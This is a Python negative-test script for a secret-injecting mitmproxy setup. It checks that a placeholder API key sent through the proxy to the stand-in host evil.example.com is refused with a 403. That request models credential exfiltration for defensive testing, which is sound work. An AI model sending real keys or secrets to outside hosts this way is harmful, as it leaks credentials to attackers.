"""Layer 3 negative tests: prove the proxy fails closed for the cases that matter.

Requires the proxy running in another terminal (see README.md).

Test A: send placeholder to a destination NOT in any binding (should 403).
Test B: send placeholder for ANTHROPIC to a different bound destination
        (we skip this because the smoke config only binds one secret;
         this case is covered by the unit tests).
Test C: stop the proxy mid-test and verify the client gets a connection error.
        (Manual: kill the proxy terminal, re-run, observe failure.)
"""

from __future__ import annotations

import sys
from pathlib import Path

import httpx

PROXY_URL = "http://127.0.0.1:14322"
CA_CERT = Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.pem"
PLACEHOLDER = "sk-ant-PLACEHOLDER-01HXY1234567890ABCDEFGH"


def test_a_unbound_destination() -> bool:
    print("Test A: send placeholder to evil.example.com (not bound)")
    try:
        response = httpx.get(
            "https://evil.example.com/",
            headers={"x-api-key": PLACEHOLDER},
            proxy=PROXY_URL,
            verify=str(CA_CERT),
            timeout=10.0,
        )
        if response.status_code == 403 and b"not in any binding" in response.content:
            print("  PASS: proxy returned 403 with expected body")
            return True
        print(
            f"  FAIL: expected 403 with binding-deny body, "
            f"got {response.status_code}: {response.text[:120]}"
        )
        return False
    except httpx.HTTPError as e:
        print(f"  FAIL: HTTP error (proxy may be down?): {e}")
        return False


def main() -> int:
    if not CA_CERT.exists():
        print(f"FAIL: mitmproxy CA not found at {CA_CERT}")
        return 1

    results = [test_a_unbound_destination()]
    if all(results):
        print("\nPASS: negative tests behave as expected")
        return 0
    print("\nFAIL: at least one negative test did not behave as expected")
    return 1


if __name__ == "__main__":
    sys.exit(main())
